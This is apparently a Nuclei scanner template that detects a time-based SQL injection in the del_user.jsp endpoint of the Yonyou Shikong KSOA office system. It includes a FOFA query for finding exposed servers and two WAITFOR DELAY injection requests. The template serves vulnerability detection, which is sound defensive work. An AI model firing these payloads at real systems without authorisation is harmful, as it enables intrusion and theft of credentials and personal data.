id: yongyoushikong-KSOA-del_user_jsp-sql-time

info:
  tags: yongyoushikong-KSOA-del_user_jsp-sql-time
  name: 用友时空KSOA del_user.jsp SQL延时注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
    用友时空KSOA系统 del_user.jsp 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        GET /km/del_user.jsp?folderid=1%27%3bWAITFOR+DELAY+%270%3a0%3a4%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /km/del_user.jsp?folderid=1%27%3bWAITFOR+DELAY+%270%3a0%3a8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and
